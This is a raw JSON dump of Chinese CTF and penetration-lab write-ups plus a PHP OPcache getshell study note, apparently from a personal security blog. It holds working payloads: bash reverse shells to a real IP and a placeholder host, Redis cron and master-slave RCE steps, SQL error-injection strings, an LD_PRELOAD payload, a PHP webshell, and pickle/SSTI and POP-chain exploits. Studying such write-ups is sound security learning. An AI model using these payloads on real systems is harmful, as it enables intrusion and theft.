substr($guessmd5,0,5).\"&lt;br&gt;\"; echo \"plase give me the md5!\"; } ?&gt; 07d68 plase give me the md5! 关键点在于绕过preg_replace，首先preg_replace获取捕获两个元组，接着对第一个元组进行substr的截取，随后进入判断，只有当第一个元组的值与其自身经过md5加密的值相等，且第二个元组等于当前时间戳经过md5加密之后的值，才能得到flag。 我们直接传入 md5[0]=%0a0e215962017&amp;md5[1]=md5(时间戳) %0a可以绕过preg_replace，因为这里没有限制是否识别换行，我们换行即可，之后进入if语句，只要耐心等待当前时间戳的最后一位是1即可。 因为只有当最后一位是1的时候$md5[0]=substr($md5[0],1);才会从%0a这第一个字符后面开始截取（截取完整字符串，除了换行符） import requests import time as time import hashlib def send(): url = \"http://1.14.71.254:28204/\" data = \"md5[0]=%0a0e215962017&amp;md5[1]={}\".format( str(hashlib.md5(str(int(time.time())).encode(\"utf-8\")).hexdigest())) urltext = requests.get(url, data) print(urltext.text) if \"NSSCTF\" in urltext.text: print(urltext.text) exit() def timeguess(): time.sleep(0.5) print(int(time.time())) for i in range(100): timeguess() send() 参考文章 [UUCTF 2022 新生赛]funmd5 UUCTF(公共赛道) 2022UUCTF-web [UUCTF 2022 新生赛]backdoor 一眼不会，扫目录发现www.zip、robots.txt，hint：backdoor.php是后门文件 大概猜到就是一句话木马，但被加密了，咱需要解密，根据wp用ida打开so文件，如下图找到了tonyenc_decode函数，定位一下发现看不懂，上百度搜搜 找到项目地址：https://github.com/lihancong/tonyenc 看一下加密过程，下图这里就是加密的特征头以及加密秘钥，我们可以在ida里面找到 全局搜索一下，发现对应的key header=[0x66, 0x88, 0xff, 0x4f,0x68, 0x86, 0x00, 0x56,0x11, 0x61, 0x16, 0x18] key[]=[0x9f,0x58,0x54,0x00,0x58,0x9f,0xff,0x23,0x8e,0xfe,0xea,0xfa,0xa6,0x35,0xf3,0xc6] 根据github源码写解密py脚本:https://github.com/lihancong/tonyenc/blob/master/core.h 网上脚本就找到这个，但解不出来，估计某些地方改了，这里我不理解最后的data[i]&lt;0之后的含义 import base64 header=[ 0x66, 0x88, 0xff, 0x4f, 0x68, 0x86, 0x00, 0x56, 0x11, 0x61, 0x16, 0x18, ] key=[ 0x9f, 0x58, 0x54, 0x00, 0x58, 0x9f, 0xff, 0x23, 0x8e, 0xfe, 0xea, 0xfa, 0xa6, 0x35, 0xf3, 0xc6] def decode(data,len): p =0 for i in range(0,len): if (i &amp; 1): p += key[p] + i; p %= 16; t = key[p]; data[i] = ~data[i]^t; if data[i] &lt; 0: data[i]=data[i]+256 decode = \"\".join([chr(c) for c in data]) return decode encodefile=open('backdoor.php',\"rb\") base64_encodestr=base64.b64encode(encodefile.read()) convert=[c for c in base64.b64decode(base64_encodestr)] del convert[0:len(header)] print(str(decode(convert,len(convert)))) 参考文章 2022UUCTF-web [UUCTF 2022 新生赛]uploadandinject 查看hint.php，根据提示访问.index.php.swp，linux下 vi -r 文件名恢复 $PATH=$_GET[\"image_path\"]; if((!isset($PATH))){ $PATH=\"upload/1.jpg\"; } echo \"&lt;div align='center'&gt;\"; loadimg($PATH); echo \"&lt;/div&gt;\"; function loadimg($img_path){ if(file_exists($img_path)){ //设置环境变量的值添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态 设置.so LD_PRELOAD设置的优先加载动态链接库 putenv(\"LD_PRELOAD=/var/www/html/$img_path\"); system(\"echo Success to load\"); echo \"&lt;br&gt;&lt;img src=$img_path&gt;\"; }else{ system(\"echo Failed to load \"); } } #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void payload() { //反弹shell system(\"cat /f*\"); } char *strcpy (char *__restrict __dest, const char *__restrict __src) { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } 参考文章 2022UUCTF-web","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"PHP-OPcacheGetshell学习","path":"/2024/04/09/php-opcachegetshell/","content":"0x01 简介 PHP项目中，尤其是在高并发大流量的场景中，如何提升PHP的响应时间，是一项十分重要的工作。而Opcache又是优化PHP性能不可缺失的组件，尤其是应用了PHP框架的项目中，作用更是明显。 在理解 OPCache 功能之前，我们有必要先理解PHP-FPM + Nginx 的工作机制，以及PHP脚本解释执行的机制。 PHP-FPM + Nginx 的工作机制 请求从web浏览器到NGINX，再到PHP处理完成，一共需要五个步骤： 第一步：启动服务 启动PHP-FPM。这个服务支持两种通信模式：TCP socket与Unix socket PHP-FPM会启动两种类型的进程：master进程和worker进程。前者用于监听端口、分配任务、管理worker进程；后者就是PHP的CGI程序，负责编译执行PHP脚本。 启动NGINX。首先会加载nginx_http_fastcgi_module 模块，初始化FastCGI执行环境，实现FastCGI协议请求代理。 这里需要注意的是：FastCGI的worker进程（CGI进程），是由PHP-FPM管理，不是NGINX，NGINX只是起代理的作用 第二步：request=》NGINX NGINX接受到请求，并基于location配置，选择一个合适的handler（算是监听器吧），这里就是代理PHP的handler 第三步：NGINX=》PHP-FPM NGINX把请求翻译为FastCGI请求，通过tcp socket/unix socket发送给PHP-FPM的master进程 第四步：PHP-FPM master=》worker PHP-FPM master进程接收到请求，分配master进程执行PHP脚本，如果没有空闲的worker，返回502 worker如果执行超时，返回504错误；处理结束，返回结果 第五步：worker=》master=》NGINX PHP-FPM Worker 进程返回处理结果，并关闭连接，等待下一个请求 PHP-FPM Master 进程通过Socket 返回处理结果 Nginx Handler顺序将每一个响应buffer发送给第一个filter → 第二个 → 以此类推 → 最终响应发送给客户端 PHP脚本解释执行的机制 了解了PHP + Nginx 整体的处理流程后，我们接下来看一下PHP脚本具体执行流程，首先我们看一个实例： &lt;?php if (!empty($_POST)) { echo \"Response Body POST: \", json_encode($_POST), \" \"; } if (!empty($_GET)) { echo \"Response Body GET: \", json_encode($_GET), \" \"; } 我们分析一下执行过程： php初始化执行环节，启动Zend引擎，加载注册的扩展模块 初始化后读取脚本文件，Zend引擎对脚本文件进行词法分析(lex)，语法分析(bison)，生成语法树 Zend 引擎编译语法树，生成opcode， Zend 引擎执行opcode，返回执行结果 在PHP cli模式下，每次执行PHP脚本，四个步骤都会依次执行一遍； 在PHP-FPM模式下，步骤1)在PHP-FPM启动时执行一次，后续的请求中不再执行；步骤2)~4)每个请求都要执行一遍； 其实步骤2)、3)生成的语法树和opcode，同一个PHP脚本每次运行的结果都是一样的， 在PHP-FPM模式下，每次请求都要处理一遍，是对系统资源极大的浪费，那么有没有办法优化呢？ 当然有，如： OPCache：前身是Zend Optimizer+ ，是 Zend Server 的一个开源组件；官方出品，强力推荐 APC：Alternative PHP Cache 是一个开放自由的 PHP opcode 缓存组件，用于缓存、优化 PHP 中间代码；已经不更新了不推荐 APCu：是APC的一个分支，共享内存，缓存用户数据，不能缓存opcode，可以配合Opcache 使用 eAccelerate：同样是不更新了，不推荐 xCache：不再推荐使用了 0x02 OPCache 介绍 OPCache 是Zend官方出品的，开放自由的 opcode 缓存扩展，还具有代码优化功能，省去了每次加载和解析 PHP 脚本的开销。 PHP 5.5.0 及后续版本中已经绑定了 OPcache 扩展。缓存两类内容: OPCode Interned String，如注释、变量名等 共享内存 UNIX/Linux 系统提供很多种进程间内存共享的方式： System-V shm API : System V共享内存, sysv shm是持久化的，除非被一个进程明确的删除，否则它始终存在于内存里，直到系统关机； mmap API： mmap映射的内存在不是持久化的，如果进程关闭，映射随即失效，除非事先已经映射到了一个文件上 内存映射机制mmap是POSIX标准的系统调用，有匿名映射和文件映射两种 mmap的一大优点是把文件映射到进程的地址空间 避免了数据从用户缓冲区到内核page cache缓冲区的复制过程； 当然还有一个优点就是不需要频繁的read/write系统调用 POSIX API：System V 的共享内存是过时的, POSIX共享内存提供了使用更简单、设计更合理的API. Unix socket API OPCache 使用了前三个共享内存机制，根据配置或者默认mmap 内存共享模式。 依据PHP字节码缓存的场景，OPCache的内存管理设计非常简单，快速读写，不释放内存，过期数据置为Wasted。 当Wasted内存大于设定值时，自动重启OPCache机制，清空并重新生成缓存。 互斥锁 任何内存资源的操作，都涉及到锁的机制。 共享内存：一个单位时间内，只允许一个进程执行写操作，允许多个进程执行读操作；写操作同时，不阻止读操作，以至于很少有锁死的情况。 这就引发另外一个问题：新代码、大流量场景，进程排队执行缓存opcode操作；重复写入，导致资源浪费。 0x03 OPCache 缓存解读 OPCache 是官方的Opcode 缓存解决方案，在PHP5.5版本之后，已经打包到PHP源码中一起发布。 它将PHP编译产生的字节码以及数据缓存到共享内存中, 在每次请求，从缓存中直接读取编译后的opcode，进行执行。 通过节省脚本的编译过程，提高PHP的运行效率。如果正在使用APC扩展，做同样的工作，现在强烈推荐OPCache来代替，尤其是PHP7中。 0x04 OPCache 的配置 内存配置 opcache.preferred_memory_model=\"mmap\" OPcache 首选的内存模块。如果留空，OPcache 会选择适用的模块， 通常情况下，自动选择就可以满足需求。可选值包括：mmap，shm,posix 以及win32。 opcache.memory_consumption=64 OPcache 的共享内存大小，以兆字节为单位，默认64M opcache.interned_strings_buffer=4 用来存储临时字符串的内存大小，以兆字节为单位，默认4M opcache.max_wasted_percentage=5 浪费内存的上限，以百分比计。如果达到此上限，那么 OPcache 将产生重新启动续发事件。默认5 允许缓存的文件数量以及大小 opcache.max_accelerated_files=2000 OPcache 哈希表中可存储的脚本文件数量上限。真实的取值是在质数集合{ 223, 463, 983, 1979, 3907, 7963, 16229, 32531, 65407, 130987 } 中找到的第一个大于等于设置值的质数。设置值取值范围最小值是200，最大值在 PHP 5.5.6 之前是100000，PHP 5.5.6 及之后是1000000。默认值2000 opcache.max_file_size=0 以字节为单位的缓存的文件大小上限。设置为 0 表示缓存全部文件。默认值0 注释相关的缓存 opcache.load_commentsboolean 如果禁用，则即使文件中包含注释，也不会加载这些注释内容。本选项可以和opcache.save_comments 一起使用，以实现按需加载注释内容。 opcache.fast_shutdown boolean 如果启用，则会使用快速停止续发事件。所谓快速停止续发事件是指依赖 Zend 引擎的内存管理模块 一次释放全部请求变量的内存，而不是依次释放每一个已分配的内存块。 二级缓存的配置 opcache.file_cache 配置二级缓存目录并启用二级缓存。启用二级缓存可以在 SHM 内存满了、服务器重启或者重置 SHM 的时候提高性能。默认值为空字符串\"\"，表示禁用基于文件的缓存。 opcache.file_cache_onlyboolean 启用或禁用在共享内存中的 opcode 缓存。 opcache.file_cache_consistency_checksboolean 当从文件缓存中加载脚本的时候，是否对文件的校验和进行验证。 opcache.file_cache_fallbackboolean 在 Windows 平台上，当一个进程无法附加到共享内存的时候， 使用基于文件的缓存，也即：opcache.file_cache_only=1。需要显示的启用文件缓存。 0x05 漏洞介绍 现在需要知道的是：OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。 关于OPCache 在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是/var/www/html/opcache，未访问前，opcache文件夹为空。接下去我去访问 index.php后，php会在 opcache文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 index.php所在目录结构相同，同时生成了 index.php.bin。 这个index.php.bin 就是 index.php 的缓存文件。并且作为www-data用户，我们对 5672f68788bcb25b11403b33f5d1497f 具有读写执行权限。这样，我们想办法把这个index.php.bin替换为包含有恶意代码的index.php.bin文件，当我们再次去访问index.php时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。 漏洞利用条件 知道opcache的缓存路径、且服务端开启了opcache.file_cache_only（也就是缓存文件优先级 优先的意思）、禁用了opcache.validate_timestamps（关闭时间戳验证）。不过这里如果开启了时间戳验证也是可以getshell，不过更麻烦 可以总结出利用方法如下： 弄清楚受害者使用的是32位还是64位操作系统 找到受害者的system ID 在本地生成缓存文件 将缓存文件中的system ID替换为受害者的system ID 用你的文件覆盖受害者的缓存文件。 get shell。 由上图已经知道了opcache缓存文件地址，并且开启了时间戳验证，因此这里需要得到文件创建时间以及system_id 漏洞复现 docker run -d -p 8888:80 -v /var/www:/var/www/html --privileged=true php:7.0 这里环境配置出问题，暂时cv文章了。这里进入之后修改配置文件php.ini //修改成(去掉;注释,将0改成1) opcache.enable=1 关闭时间戳验证 ;opcache.validate_timestamps=1 //修改成(去掉;注释,将1改成0) opcache.validate_timestamps=0 设置Opcache缓存路径 ;opcache.file_cache= //修改 opcache.file_cache=\"/tmp/opcache\" 设置缓存优先级 ;opcache.file_cache_only=0 //修改 opcache.file_cache_only=1 在最后一行添加 用来引用opcache zend_extension=opcache.so 重启服务器生效 在宿主机的web目录创建即可 index.php &lt;html&gt; &lt;body&gt; &lt;form action=\"upload-file.php\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;filename:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br/&gt; &lt;label for=\"filepath\"&gt;filepath:&lt;/label&gt; &lt;input type=\"text\" name=\"filepath\" id=\"filepath\" /&gt; &lt;br/&gt; &lt;input type=\"submit\" name=\"submit\" value=\"submit\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; file_upload.php &lt;?php $path = $_POST['filepath']; echo \"filename: \" . $_FILES[\"file\"][\"name\"] . \"&lt;br /&gt;\"; echo \"type: \" . $_FILES[\"file\"][\"type\"] . \"&lt;br /&gt;\"; echo \"size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" Kb&lt;br /&gt;\"; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $path . $_FILES[\"file\"][\"name\"]); echo \"save : \" . $path . $_FILES[\"file\"][\"name\"]; ?&gt; phpinfo.php &lt;?php phpinfo(); ?&gt; 假设目标站点已经又一个phpinfo()文件了，通过这个文件可以得到Opcache缓存目录,还需要下一步计算system_id system_id是当前PHP版本号，Zend扩展版本号以及各个数据类型大小的MD5哈希值 脚本地址:https://github.com/GoSecure/php7-opcache-override 此时可以利用上传漏洞将文件上传到web目录，但是目录没有读写的权限，这时候就可通过/tmp/opcache/[system_id]/var/www/index.php.bin为一个webshell的二进制缓存运行webshell 本地构建webshell文件index.php &lt;?php system($_GET['cmd']); ?&gt; 1.在本地php.ini中设置opcache.file_cache为你所想要指定的缓存目录 2.运行php服务器向index发送请求，触发缓存疫情进行文件缓存 3.打开缓存目录中的index.php.bin文件修改里面的的system_id为目标站点的system_id 记事本打开就ok改成我们用脚本计算出来的system_id值 通过上传漏洞将修改后的index.php.bin上传到tmp/opcache/[system_id]/var/www/index.php.bin覆盖掉原来的index.php.bin 至于2023春秋杯夏季赛的php_again，思路也大致相同，不过那个是php8.0版本的getshell，更为复杂，而且里面涉及到了软链接，同时还需要用到一个python的提权RCE，有点复杂，暂时只想看个思路了，复现有点难（毕竟环境还搭不起来） 0x06 参考文章 CISCN2023 unzip软链接getshell PHP8 OPCACHE缓存文件导致RCE 2023年春秋杯网络安全联赛春季赛 web php_again [PHP 8.2.2 OPcache Binary Webshell + CVE-2022-42919 LPE] PHP Opcache的工作原理 利用PHP的OPcache机制getshell php7的Opcache getshell","tags":["基本知识"],"categories":["基本知识"]},{"path":"/2024/03/31/shen-tou-ce-shi-ji-lu/","content":"Web1 FLAG1 进入页面看源码 到这里就可以想到ssrf漏洞了，直接尝试file伪协议读取敏感文件 这里也是直接成功，没有过滤，接下来根据提示说flag在根目录，尝试直接读取/flag，也是直接拿到 FLAG3 提示内网范在：172.18.240.0/24，直接利用http协议进行内网主机探测，如下图发现两台存活主机，不过关注第二个即可 初步扫除两台内网主机：172.18.240.5和172.18.240.7，其中5为当前服务器，不用理会。接着扫一些敏感目录，很幸运，看到7主机的6379端口已打开 直接dict尝试看一下是否是未授权，如下图，确定为未授权，尝试写入计划任务反弹shell # 清空 key dict://172.18.240.7:6379/flushall # 设置要操作的路径为定时任务目录 dict://172.18.240.7:6379/config set dir /var/spool/cron/ # 在定时任务目录下创建 root 的定时任务文件 dict://172.18.240.7:6379/config set dbfilename root # 写入 Bash 反弹 shell 的 payload dict://172.18.240.7:6379/set 1 \" * * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/5555 0&gt;%261 \" # 保存上述操作 dict://172.18.240.7:6379/save 最终拿到shell，得到flag FLAG3 在这里也是尴尬，拿到shell了，以为说的数据库指的是MySQL，研究了半天无果，突然想到redis也是数据库，尝试读取当前数据库所有的key 看到存在flag 的key，直接get拿到即可 Web2 FLAG1 访问首页，经典weblogic页面，这里找了几个网上poc没啥用，接着直接工具梭哈了 发现存在CVE-2017-10271（xml反序列化漏洞），直接命令执行去 拿到flag1 之后还想着工具一把梭，奈何工具垃圾，还是手工吧，访问wls-wsat/CoordinatorPortType路由，尝试poc利用xml反序列化，如上图，成功反弹shell &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/124.220.233.26/5555 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 发现一个存活主机172.25.20.12 nmap --script=mysql-brute --script-args userdb=/home/kali/user.txt,passdb=/home/kali/pass.txt 192.168.71.1 -p 3306 这里感觉就是MySQL的爆破，但也可能不是。 Web3 FLAG1 看到网站用的java servlet，先扫个目录看看 很好，典型的Spring boot actuator敏感信息泄露，直接访问/acutuator/env看一下环境配置信息 直接拿到flag Web5 打开网站直接dirsearch扫目录，找到admin的登录页面 首页是后台登录页面，信息搜索无果，接着尝试sql注入，bp抓包 如上图，输入不正确的用户名，会回显不存在，所以需要找到正确用户名，尝试直接对这user或password参数进行sql注入 很幸运发现数据库存在sql注入，且会回显报错信息，那就尝试报错注入（这里手工fuzz或者网上文章，可以找到该网站过滤的sql注入关键字）但双写即可绕过 1'or updatexml(1,concat(0x7e,(database()),0x7e),1)%23 爆出数据库名，继续执行即可，不过这里直接显示了字段名，我们针对的查找username和password即可 1'or updatexml(1,concat(0x7e,(seleselectct group_concat(table_name) fr from om information_schema.tables whe where re table_schema like 'beescms'),0x7e),1)%23 接着就能爆破用户名和密码了 1'or updatexml(1,concat(0x7e,(seleselectct admin_name fr from om bees_admin),0x7e),1)%23 1'or updatexml(1,concat(0x7e,(seleselectct admin_password fr from om bees_admin),0x7e),1)%23 用户名为meetsec，密码回显不全，substring处理一下就行，这里不写了，最后是缺少个字母b，上md5破解网站爆破得到密码为Login123 2446d54c2e68d221db9cff653b01a0eb 登陆之后找到文件上传页面upload.php 测试了一下发现只是检测mime内容，修改一下即可 点击图片列表可以找到上传的图片路径，修改对应文件名即可，之后访问直接getshell，没有过滤，如下图得到flag Web6 这里经典tomcat中间件，高版本以及扫目录发现manage存在，直接访问发现是一个http身份认证，抓包爆破弱口令 成功爆破：tomcat:qwe123 这里之前爆破了n长时间无果，搞得以为又是什么其他漏洞，结果是字典问题 进入后台就是常规上传war包了，这里尝试了多个jsp马，但最后都连不上去，也不知道为啥，感觉是木马问题 之后只能尝试msfvenom生成一个反弹shell的jsp马，最终部署后访问，得到shell Web7 看端口和页面回显就知道了，这里存在redis未授权，尝试直接redis-cli连接 发现只能使用几个读取命令，没有写的权限，也就是普通用户权限，那可以想到利用redis主从复制直接拿shell 利用工具https://github.com/n0b0dyCN/redis-rogue-server/，在vps起一个恶意redis服务，让靶机成为我们的从服务器，直接靠全量复制上传exp.so，成功拿shell 这里做完没有截图，结果重新做的时候环境都出问题了，使用备用靶机发现似乎目标机配置有问题？相同命令在这里用不了了 这里直接cat /flag是可以拿到的 Web9 这道题很幸运，在第一台主机访问的时候，页面回显404，也就知道是个Java框架，但不知道咋利用，耗了一天没思路，第二天继续扫目录，依旧无果，但是在回头做Web2的时候，在拿下第一台主机shell之后，尝试用fscan扫了一下内网主机漏洞。 结果就出Web9这个主机存在nacos的弱口令，简直神了，接着就是登录，但这时候又没有思路了，尝试了网上的几个工具，但是不存在相关的反序列化漏洞，之后无意间查看了配置详情，结果看到了shiro key的泄露，这下思路有了 直接工具梭哈了，如下图，爆破出利用链，直接命令执行得到flag 总结 目前经验太少了，平常没有多实践，因此遇到这次渗透靶场的题，思路几乎跟着网上文章都是碰出来的，这提示着我今后还需要多实践一下。 在上面的web2内网中，就由于自己内网知识的欠缺，始终不知道如何完美的下手，内网隧道搭不起来，导致最终无果。 web3是一个MySQL数据库的暴漏，但我也只知道爆破一下密码。其余也没有什么思路了。。。。 参考文章 WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现 Spring Boot Actuator 未授权的测试与利用思路 对于Spring Boot的渗透姿势 Springboot之Actuator信息泄露漏洞利用 beescms代码审计"},{"title":"i春秋CTF刷题","path":"/2024/03/29/i-chun-qiu-shua-ti-ji-lu/","content":"2023年春秋杯网络安全联赛春季赛 picup 先dirsearch扫目录，发现login.php和register.php 接着注册登录一个用户即可，会看到上传页面，这里也是尝试了多次才上传成功，上传成功之后会显示一个上传路径以及pic.php的东西，猜测这里就是给pic传参，能够目录遍历之类的 这里跟着wp发现存在目录遍历，不过过滤了…/，但双写即可绕过（这里也是服了，一个php的站，结果是python的洞） 接下来查看python源码 import os import pickle import base64 import hashlib from flask import Flask,request,session,render_template,redirect from Users import Users from waf import waf users=Users() app=Flask(__name__) app.template_folder=\"./\" app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest() @app.route('/',methods=['GET','POST']) @app.route('/index.php',methods=['GET','POST']) def index(): if not session or not session.get('username'): return redirect(\"login.php\") if request.method==\"POST\" and 'file' in request.files and (filename:=waf(request.files['file'])): filepath=os.path.join(\"./uploads\",filename) request.files['file'].save(filepath) return \"File upload success! Path: &lt;a href='pic.php?pic=\"+filename+\"'&gt;\"+filepath+\"&lt;/a&gt;.\" return render_template(\"index.html\") @app.route('/login.php',methods=['GET','POST']) def login(): if request.method==\"POST\" and (username:=request.form.get('username')) and (password:=request.form.get('password')): if type(username)==str and type(password)==str and users.login(username,password): session['username']=username return \"Login success! &lt;a href='/'&gt;Click here to redirect.&lt;/a&gt;\" else: return \"Login fail!\" return render_template(\"login.html\") @app.route('/register.php',methods=['GET','POST']) def register(): if request.method==\"POST\" and (username:=request.form.get('username')) and (password:=request.form.get('password')): if type(username)==str and type(password)==str and not username.isnumeric() and users.register(username,password): return \"Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.\".format(username=username).format(users=users) else: return \"Register fail!\" return render_template(\"register.html\") @app.route('/pic.php',methods=['GET','POST']) def pic(): if not session or not session.get('username'): return redirect(\"login.php\") if (pic:=request.args.get('pic')) and os.path.isfile(filepath:=\"./uploads/\"+pic.replace(\"../\",\"\")): if session.get('username')==\"admin\": return pickle.load(open(filepath,\"rb\")) else: return '''&lt;img src=\"data:image/png;base64,'''+base64.b64encode(open(filepath,\"rb\").read()).decode()+'''\"&gt;''' res=\"&lt;h1&gt;files in ./uploads/&lt;/h1&gt;&lt;br&gt;\" for f in os.listdir(\"./uploads\"): res+=\"&lt;a href='pic.php?pic=\"+f+\"'&gt;./uploads/\"+f+\"&lt;/a&gt;&lt;br&gt;\" return res if __name__ == '__main__': app.run(host='0.0.0.0', port=80) 这里主要看pic函数的处理就行，说是如果存在pic参数，且pic参数与uploads拼接之后的文件存在，则进入下一个if语句，继续判断如果session里面的username值为admin，就会调用pickle.load将文件内容反序列化出来，进而展示。 很明显就是pickle的反序列化漏洞了，接下来看如何伪造admin的session 这里也是看了wp才知道如何伪造的，这里用的是format的格式化漏洞，这个漏洞可参考p神：Python 格式化字符串漏洞（Django为例） 如上图，拿到了admin的password，利用他来伪造session（因为上述session的key就是admin的密码） 3720c7094d15e3d181c48d5199bcdde9 eyJ1c2VybmFtZSI6ImFkbWluIn0.ZhEK1Q.8tM16cciuq2JtEt9gXj6Uj-olHg 这里看wp直接上传的模板去RCE（poc文件） {{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}} 接着上传exp文件，之后利用pickle触发执行 import pickle from flask import render_template class EXP(): def __reduce__(self): return(render_template,(\"uploads/poc\",)) exp=EXP() f=open(\"exp\",\"wb\") pickle.dump(exp,f) bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}' 由于flag没有读取权限，但clear.sh可读可写，且每十分钟会执行，写入echo cat /flag&gt;1.txt即可 参考文章 2023年春秋杯网络安全联赛冬季赛 2023年春秋杯网络安全联赛冬季赛 Writeup ezezez_php &lt;?php highlight_file(__FILE__); include \"function.php\"; class Rd { public $ending; public $cl; public $poc; public function __destruct() { echo \"All matters have concluded\".\"&lt;/br&gt;\"; } public function __call($name, $arg) { foreach ($arg as $key =&gt; $value) { if ($arg[0]['POC'] == \"0.o\") { $this-&gt;cl-&gt;var1 = \"get\"; } } } } class Poc { public $payload; public $fun; public function __set($name, $value) { $this-&gt;payload = $name; $this-&gt;fun = $value; } function getflag($paylaod) { echo \"Have you genuinely accomplished what you set out to do?\".\"&lt;/br&gt;\"; file_get_contents($paylaod); } } class Er { public $symbol; public $Flag; public function __construct() { $this-&gt;symbol = True; } public function __set($name, $value) { if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',base64_decode($this-&gt;Flag))){ $value($this-&gt;Flag); } else { echo \"NoNoNo,please you can look hint.php\".\"&lt;/br&gt;\"; } } } class Ha { public $start; public $start1; public $start2; public function __construct() { echo $this-&gt;start1 . \"__construct\" . \"&lt;/br&gt;\"; } public function __destruct() { if ($this-&gt;start2 === \"o.0\") { $this-&gt;start1-&gt;Love($this-&gt;start); echo \"You are Good!\".\"&lt;/br&gt;\"; } } } function get($url) { $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output); } if (isset($_POST['pop'])) { $a = unserialize($_POST['pop']); } else { die(\"You are Silly goose!\"); } ?&gt; pop链子如下 &lt;?php class Rd { public $ending; public $cl; public $poc; } class Poc { public $payload; public $fun; } class Er { public $symbol; public $Flag; } class Ha { public $start; public $start1; public $start2; } //依次写入即可 /* dict://127.0.0.1:6379/flushall dict://127.0.0.1:6379/config set dir /tmp dict://127.0.0.1:6379/config set dbfilename exp.so dict://127.0.0.1:6379/slaveof ip port dict://127.0.0.1:6379/system.exec env */ $payload = \"dict://127.0.0.1:6379/system.exec env\"; $pop = new Ha(); $pop-&gt;start = ['POC'=&gt;'0.o']; $pop-&gt;start1 = new Rd(); $pop-&gt;start2 = \"o.0\"; $pop-&gt;start1-&gt;cl = new Er(); $pop-&gt;start1-&gt;cl-&gt;Flag = base64_encode($payload); echo serialize($pop); ?&gt; Active-Takeaway Java题目，目前不会，看了看似乎很难，且没学过 说是可以参考：https://www.yulegeyu.com/ ezdede 获得提示弱密码为：admin@123。随后admin用户登录后台 参考：[DedeCMS V5.7 SP2后台存在代码执行漏洞](http://www.xcxan.cn/archives/240)–进行复现即可 dede/tpl.php?filename=aahybcx.lib.php&amp;action=savetagfile&amp;content=&lt;?=`cat /flag`;?&gt;&amp;token=f32f26ac2fb800623e06fa0c3d9155ef 这里用个短标签绕过即可 参考文章 春秋杯冬季赛 2023 Writeup 2023年春秋杯网络安全联赛春季赛 phpstudy 刚开始也是懵逼，404页面，看了答案发现，这里考察的是个Ajax请求，我们需要添加如下 X-Requested-With：XMLHttpRequest 之后才能看到正常页面，之后依旧是看的答案（说是个1day） 跟着复现，首先前端存在update注入（真不知道比赛的时候如何才会想到，唉） admin';update admins set password='c26be8aaf53b15054896983b43eb6a65';-- 忽略报错，之后登录即可，如果登录过后还是404，继续随机验证码绕过，这里还可以发现依旧存在xss漏洞 接下来添加计划任务RCE即可，这里我反弹shell 成功拿到shell，回顾一下还是难以理解，我不知道哪里能得知该系统版本，大佬思路想象不到 参考文章 phpstudy小皮面板2023版RCE easypy 扫目录发现download，下载源码发现app.py啥也没有，之后看到另一个目录存在app的编译文件pyc，尝试反编译得到源码 pip3安装uncompyle即可 # uncompyle6 version 3.9.1 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.8.6 (tags/v3.8.6:db45529, Sep 23 2020, 15:52:53) [MSC v.1927 64 bit (AMD64)] # Embedded file name: app.py # Compiled at: 2023-04-16 23:41:59 # Size of source mod 2**32: 1030 bytes import numpy, base64 from flask import Flask, Response, request app = Flask(__name__) @app.route(\"/\", methods=[\"GET\", \"POST\"]) def index(): return \"小p想要找一个女朋友，你能帮他找找看么？\" @app.route(\"/girlfriends\", methods=[\"GET\", \"POST\"]) def girlfriends(): if request.values.get(\"data\"): data = request.values.get(\"data\") numpydata = base64.b64decode(data) if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata: return \"不能走捷径啊\" resp = numpy.loads(numpydata) return \"可以的，要的就是一种感觉\" return \"有进步了,但是不多\" @app.route(\"/download\", methods=[\"GET\", \"POST\"]) def download(): with open(\"www.zip\", 